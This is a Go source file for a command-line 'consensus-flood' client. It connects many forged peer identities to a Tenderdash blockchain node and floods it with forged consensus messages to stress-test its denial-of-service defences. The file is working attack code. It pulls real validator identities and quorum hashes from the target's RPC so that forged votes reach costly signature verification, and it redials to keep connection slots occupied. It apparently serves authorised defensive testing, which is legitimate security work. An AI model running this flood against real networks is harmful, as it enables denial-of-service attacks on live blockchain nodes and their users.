//go:build floodclient

// Command consensus-flood is a p2p-level consensus flood client for
// stress-testing a Tenderdash node's DoS defences on a controlled network.
//
// It connects to a target node as one or more ordinary peers (fresh identities)
// via the real p2p handshake and floods a selected consensus message profile at
// a configured rate for a configured duration.
//
// It is guarded behind the "floodclient" build tag and is never linked into the
// production node. Build with: go build -tags floodclient ./test/floodclient/cmd/consensus-flood
//
// This is an attack tool for a private, embargoed fork. Point it only at
// networks you are authorised to test.
package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/dashpay/dashd-go/btcjson"

	"github.com/dashpay/tenderdash/libs/log"
	"github.com/dashpay/tenderdash/privval"
	"github.com/dashpay/tenderdash/test/floodclient"
	"github.com/dashpay/tenderdash/types"
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
}

func run() error {
	var (
		targetAddr = flag.String("target", "", "target node p2p address host:port (required)")
		nodeID     = flag.String("node-id", "", "target node ID (hex); checked against the handshake if set")
		chainID    = flag.String("chain-id", "", "target network / chain ID (must match the target; auto-filled by --from-rpc)")
		fromRPC    = flag.String("from-rpc", "",
			"target's Tenderdash RPC URL (e.g. http://host:26657). When set, the validator set, "+
				"quorum hash, quorum type, chain ID and current consensus height/round are read from "+
				"the node and used to fill the corresponding flags. Explicit flags still override it. "+
				"Required by --mixed so the honest voter can track the target's live height/round.")
		profile    = flag.String("profile", "prevote", "attack profile: "+profileNames())
		identities = flag.Int("identities", 1, "number of distinct peer identities (connections)")
		rate       = flag.Float64("rate", 10, "messages per second per identity")
		duration   = flag.Duration("duration", 30*time.Second, "total run duration")
		ramp       = flag.Duration("ramp", 0, "spread identity connect over this duration (0 = all at once)")
		reconnect  = flag.Bool("reconnect", true,
			"redial with the same identity when a connection drops, so its node-ID lane stays "+
				"occupied for the whole run instead of the flood tapering as connections die")
		maxPacketPayload = flag.Int("max-packet-payload", 1024,
			"cap on each MConnection packet's payload; must be <= the target's "+
				"max-packet-msg-payload-size or the target drops the connection mid-frame on a "+
				"large message. Default 1024 (the stock node default) is safe against a standard "+
				"target; raise it only if the target's limit is known to be higher.")
		height     = flag.Int64("height", 1, "consensus height to forge for")
		round      = flag.Int("round", 0, "consensus round to forge for")
		hsTimeout  = flag.Duration("handshake-timeout", 10*time.Second, "per-connection handshake timeout")
		logLevel   = flag.String("log-level", "info", "log level")
		validators = flag.String("validators", "",
			"comma-separated index:proTxHashHex pairs of the target's real validators. "+
				"A forged vote must carry a real validator identity to reach the node's "+
				"signature verification (a random identity is rejected before the budget). "+
				"These are public on the network. Empty falls back to random identities.")
		quorumHash = flag.String("quorum-hash", "",
			"target's active quorum hash (hex), used by the commit profile so the commit "+
				"reaches signature verification instead of being rejected on quorum mismatch")
		mixed = flag.Bool("mixed", false,
			"run an honest client (a real validator sending genuinely-signed votes) alongside "+
				"the attackers, so honest service can be measured under the same flood. Requires "+
				"--signing-key, --signing-index, --quorum-hash and --quorum-type.")
		signingKey = flag.String("signing-key", "",
			"path to a validator privval key file (FilePV). Enables the honest client and the "+
				"precommit-invalid-extension profile, both of which need a genuine block signature. "+
				"On a real network only a validator you control has this.")
		signingIndex = flag.Int("signing-index", -1, "the signing validator's index in the set (with --signing-key)")
		quorumType   = flag.Int("quorum-type", 0, "the target's active quorum LLMQ type (with --signing-key)")
	)
	flag.Parse()

	if *targetAddr == "" {
		flag.Usage()
		return fmt.Errorf("--target is required")
	}

	logger, err := log.NewDefaultLogger(log.LogFormatPlain, *logLevel)
	if err != nil {
		return err
	}

	forgeCfg, err := buildForgeConfig(*validators, *quorumHash)
	if err != nil {
		return err
	}

	// Auto-discovery: read the target's validator set, quorum params, chain ID
	// and current height/round from its RPC, filling every value the operator did
	// not set explicitly. A single live-state source is built from the same URL so
	// the flood and the honest voter can track the target's height/round as it
	// advances rather than freezing the value read at startup. Explicit flags win.
	var liveSource *floodclient.RPCLiveState
	if *fromRPC != "" {
		dctx, dcancel := context.WithTimeout(context.Background(), 20*time.Second)
		disc, derr := floodclient.DiscoverFromRPC(dctx, *fromRPC)
		dcancel()
		if derr != nil {
			return fmt.Errorf("discover from rpc %q: %w", *fromRPC, derr)
		}
		applyDiscovery(disc, explicitlySetFlags(), chainID, &forgeCfg, quorumType, height, round)
		liveSource, err = floodclient.NewRPCLiveState(*fromRPC)
		if err != nil {
			return err
		}
		logger.Info("discovered target params from rpc",
			"rpc", *fromRPC, "chain_id", disc.ChainID, "validators", len(disc.Validators),
			"quorum_type", disc.QuorumType, "quorum_hash", hex.EncodeToString(disc.QuorumHash),
			"height", disc.Height, "round", disc.Round)
	}

	if *chainID == "" {
		flag.Usage()
		return fmt.Errorf("--chain-id is required (or use --from-rpc to read it from the target)")
	}

	signer, err := buildSigner(*signingKey, *signingIndex, *chainID, *quorumType, forgeCfg.QuorumHash)
	if err != nil {
		return err
	}
	forgeCfg.Signer = signer
	if *mixed {
		if signer == nil {
			return fmt.Errorf("--mixed requires --signing-key, --signing-index, --quorum-hash and --quorum-type")
		}
		if liveSource == nil {
			return fmt.Errorf("--mixed requires --from-rpc so the honest voter can track the target's live height/round")
		}
	}
	profiles := floodclient.BuildProfiles(forgeCfg)
	prof, ok := profiles[*profile]
	if !ok {
		return fmt.Errorf("unknown profile %q; available: %s", *profile, profileNames())
	}
	host, portStr, err := net.SplitHostPort(*targetAddr)
	if err != nil {
		return fmt.Errorf("invalid --target %q: %w", *targetAddr, err)
	}
	port, err := strconv.ParseUint(portStr, 10, 16)
	if err != nil {
		return fmt.Errorf("invalid --target port %q: %w", portStr, err)
	}

	if len(forgeCfg.Validators) == 0 && voteShapedProfile(*profile) {
		logger.Info("no --validators supplied: forged votes will carry random identities " +
			"and be rejected before the verification budget; supply the target's validator " +
			"proTxHashes to exercise the budget")
	}

	target := floodclient.Target{
		Host:             host,
		Port:             uint16(port),
		NodeID:           types.NodeID(*nodeID),
		Network:          *chainID,
		MaxPacketPayload: *maxPacketPayload,
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()
	runCtx, runCancel := context.WithTimeout(ctx, *duration)
	defer runCancel()

	logger.Info("starting consensus flood",
		"target", *targetAddr, "chain_id", *chainID, "profile", *profile,
		"identities", *identities, "rate_per_identity", *rate, "duration", *duration)

	// live tracks the height/round the flood forges for. It starts at the
	// configured (or discovered) values; when an RPC source is available a poller
	// refreshes it so forged messages stay current as the target advances, the
	// same reason the reactor harness re-reads height/round each tick. Without an
	// RPC source it stays at the startup value.
	var live atomicLiveState
	live.set(*height, int32(*round))
	if liveSource != nil {
		go pollLiveState(runCtx, logger, liveSource, &live)
	}

	var (
		wg       sync.WaitGroup
		sent     atomic.Int64
		sendErrs atomic.Int64
		dialOK   atomic.Int64
		dialErrs atomic.Int64
	)

	for i := 0; i < *identities; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()

			// Stagger connects across the ramp window.
			if *ramp > 0 && *identities > 1 {
				delay := time.Duration(int64(*ramp) * int64(idx) / int64(*identities))
				select {
				case <-time.After(delay):
				case <-runCtx.Done():
					return
				}
			}

			interval := time.Duration(float64(time.Second) / *rate)
			if interval <= 0 {
				interval = time.Nanosecond
			}

			// One identity per goroutine, reused across reconnects so the node-ID
			// lane it holds on the target is the same one each time. Without this
			// a dropped connection would surrender its lane and the flood would
			// taper as connections die rather than holding the slots.
			identity := floodclient.NewIdentity()
			firstDial := true

			for runCtx.Err() == nil {
				conn, err := floodclient.Dial(runCtx, logger, identity, target, *hsTimeout)
				if err != nil {
					dialErrs.Add(1)
					if runCtx.Err() == nil {
						logger.Debug("dial failed", "identity", idx, "err", err)
					}
					if firstDial || !*reconnect {
						return
					}
					// Brief backoff before reclaiming the lane.
					select {
					case <-time.After(500 * time.Millisecond):
						continue
					case <-runCtx.Done():
						return
					}
				}
				if firstDial {
					dialOK.Add(1)
					firstDial = false
				}

				sendLoop(runCtx, logger, conn, prof, &live, interval, idx, &sent, &sendErrs)
				_ = conn.Close()
				if !*reconnect {
					return
				}
			}
		}(i)
	}

	// Mixed mode: an honest validator sends genuinely-signed prevotes alongside
	// the flood, so honest service can be measured under the same run. It votes
	// nil at the target's LIVE height/round (tracked via --from-rpc), so its
	// acceptance reflects the real service the node provides under flood. Voting
	// FOR the proposed block would additionally need the block ID from the
	// target's round state — deeper proposal tracking that is out of scope.
	var honestSent atomic.Int64
	if *mixed {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := floodclient.Dial(runCtx, logger, floodclient.NewIdentity(), target, *hsTimeout)
			if err != nil {
				logger.Error("honest client dial failed", "err", err)
				return
			}
			defer func() { _ = conn.Close() }()
			voter := floodclient.NewHonestVoter(conn, signer)
			ticker := time.NewTicker(time.Second) // honest gossip rate, not a flood
			defer ticker.Stop()
			for {
				select {
				case <-runCtx.Done():
					return
				case <-ticker.C:
					if _, _, err := voter.SendPrevoteLive(runCtx, &live); err != nil {
						if runCtx.Err() == nil {
							logger.Debug("honest prevote failed", "err", err)
						}
						continue
					}
					honestSent.Add(1)
				}
			}
		}()
	}

	// Periodic progress.
	progressDone := make(chan struct{})
	go func() {
		defer close(progressDone)
		t := time.NewTicker(5 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-runCtx.Done():
				return
			case <-t.C:
				logger.Info("progress",
					"connected", dialOK.Load(), "dial_errors", dialErrs.Load(),
					"sent", sent.Load(), "send_errors", sendErrs.Load())
			}
		}
	}()

	wg.Wait()
	<-progressDone

	logger.Info("flood complete",
		"connected", dialOK.Load(), "dial_errors", dialErrs.Load(),
		"sent", sent.Load(), "send_errors", sendErrs.Load(),
		"honest_votes_sent", honestSent.Load())
	return nil
}

// sendLoop forges and sends messages on conn at the given interval until the
// run ends or a send fails. It returns on the first send error so the caller can
// decide whether to redial (holding the lane) or give up.
func sendLoop(
	ctx context.Context,
	logger log.Logger,
	conn *floodclient.Conn,
	prof floodclient.Profile,
	live *atomicLiveState,
	interval time.Duration,
	idx int,
	sent, sendErrs *atomic.Int64,
) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			h, r := live.get()
			if err := conn.Send(ctx, prof.Next(h, r)); err != nil {
				sendErrs.Add(1)
				if ctx.Err() == nil {
					logger.Debug("send failed", "identity", idx, "err", err)
				}
				return
			}
			sent.Add(1)
		}
	}
}

// atomicLiveState holds the target's current consensus height/round, refreshed
// by a background poller and read concurrently by the flood goroutines and the
// honest voter. It satisfies floodclient.LiveState.
type atomicLiveState struct {
	height atomic.Int64
	round  atomic.Int32
}

func (a *atomicLiveState) set(height int64, round int32) {
	a.height.Store(height)
	a.round.Store(round)
}

func (a *atomicLiveState) get() (int64, int32) {
	return a.height.Load(), a.round.Load()
}

// CurrentHeightRound reports the last polled height/round, so the honest voter
// votes at the target's live height/round rather than one frozen at startup.
func (a *atomicLiveState) CurrentHeightRound(context.Context) (int64, int32, error) {
	h, r := a.get()
	return h, r, nil
}

// pollLiveState refreshes live from the target's RPC once a second until ctx is
// done, so the flood and the honest voter follow the target as it advances.
func pollLiveState(ctx context.Context, logger log.Logger, src *floodclient.RPCLiveState, live *atomicLiveState) {
	t := time.NewTicker(time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			h, r, err := src.CurrentHeightRound(ctx)
			if err != nil {
				if ctx.Err() == nil {
					logger.Debug("live height/round poll failed", "err", err)
				}
				continue
			}
			live.set(h, r)
		}
	}
}

// explicitlySetFlags returns the set of flags the operator passed on the command
// line, so discovery fills only the values that were not given explicitly.
func explicitlySetFlags() map[string]bool {
	set := map[string]bool{}
	flag.Visit(func(f *flag.Flag) { set[f.Name] = true })
	return set
}

// applyDiscovery fills chain ID, validator set, quorum params and height/round
// from disc for every flag the operator did not set explicitly. Explicit flags
// always win, so --from-rpc composes with them rather than overriding them.
func applyDiscovery(
	disc *floodclient.DiscoveredParams,
	set map[string]bool,
	chainID *string,
	forgeCfg *floodclient.ForgeConfig,
	quorumType *int,
	height *int64,
	round *int,
) {
	if !set["chain-id"] {
		*chainID = disc.ChainID
	}
	if !set["validators"] {
		forgeCfg.Validators = disc.Validators
	}
	if !set["quorum-hash"] {
		forgeCfg.QuorumHash = disc.QuorumHash
	}
	if !set["quorum-type"] {
		*quorumType = int(disc.QuorumType)
	}
	if !set["height"] {
		*height = disc.Height
	}
	if !set["round"] {
		*round = int(disc.Round)
	}
}

// buildSigner loads a validator signing identity from a privval key file, if one
// is supplied, together with the quorum context needed to produce signatures the
// target verifies. It returns nil (no error) when no key is given, so the tool
// runs keyless. On a real network only a validator you control provides the key.
func buildSigner(keyFile string, index int, chainID string, quorumType int, quorumHash []byte) (*floodclient.SigningIdentity, error) {
	if keyFile == "" {
		return nil, nil
	}
	if index < 0 {
		return nil, fmt.Errorf("--signing-index is required with --signing-key")
	}
	if len(quorumHash) == 0 {
		return nil, fmt.Errorf("--quorum-hash is required with --signing-key")
	}
	// SignVote persists its last-signed state after every signature, so it needs
	// a writable state path even though this tool has no double-sign history to
	// protect: an empty path makes every honest signature fail. A throwaway temp
	// file gives it somewhere to write and is discarded with the process.
	stateFile, err := os.CreateTemp("", "floodclient-signstate-*.json")
	if err != nil {
		return nil, fmt.Errorf("create signer state file: %w", err)
	}
	_ = stateFile.Close()
	pv, err := privval.LoadFilePVEmptyState(keyFile, stateFile.Name())
	if err != nil {
		return nil, fmt.Errorf("load signing key %q: %w", keyFile, err)
	}
	return &floodclient.SigningIdentity{
		PrivVal:    pv,
		Index:      int32(index),
		ChainID:    chainID,
		QuorumType: btcjson.LLMQType(quorumType),
		QuorumHash: quorumHash,
	}, nil
}

func profileNames() string {
	names := make([]string, 0, len(floodclient.Profiles))
	for n := range floodclient.Profiles {
		names = append(names, n)
	}
	sort.Strings(names)
	return fmt.Sprintf("%v", names)
}

// voteShapedProfile reports whether a profile forges votes, which is what needs
// real validator identities to reach the verification budget. The other
// profiles (commit, proposal, block part, state, maj23) do not.
func voteShapedProfile(name string) bool {
	return name == "prevote" || name == "precommit-extensions"
}

// buildForgeConfig parses the --validators and --quorum-hash flags into a
// ForgeConfig. --validators is a comma-separated list of index:proTxHashHex
// pairs identifying the target's real validators; --quorum-hash is the hex
// quorum hash the commit profile needs.
func buildForgeConfig(validators, quorumHash string) (floodclient.ForgeConfig, error) {
	cfg := floodclient.ForgeConfig{}

	if quorumHash != "" {
		qh, err := hex.DecodeString(quorumHash)
		if err != nil {
			return cfg, fmt.Errorf("invalid --quorum-hash %q: %w", quorumHash, err)
		}
		cfg.QuorumHash = qh
	}

	if validators == "" {
		return cfg, nil
	}
	for _, pair := range strings.Split(validators, ",") {
		pair = strings.TrimSpace(pair)
		if pair == "" {
			continue
		}
		idxStr, hexStr, ok := strings.Cut(pair, ":")
		if !ok {
			return cfg, fmt.Errorf("invalid --validators entry %q: want index:proTxHashHex", pair)
		}
		idx, err := strconv.ParseInt(strings.TrimSpace(idxStr), 10, 32)
		if err != nil {
			return cfg, fmt.Errorf("invalid validator index %q: %w", idxStr, err)
		}
		proTxHash, err := hex.DecodeString(strings.TrimSpace(hexStr))
		if err != nil {
			return cfg, fmt.Errorf("invalid validator proTxHash %q: %w", hexStr, err)
		}
		cfg.Validators = append(cfg.Validators, floodclient.ForgedValidator{
			ProTxHash: proTxHash,
			Index:     int32(idx),
		})
	}
	return cfg, nil
}
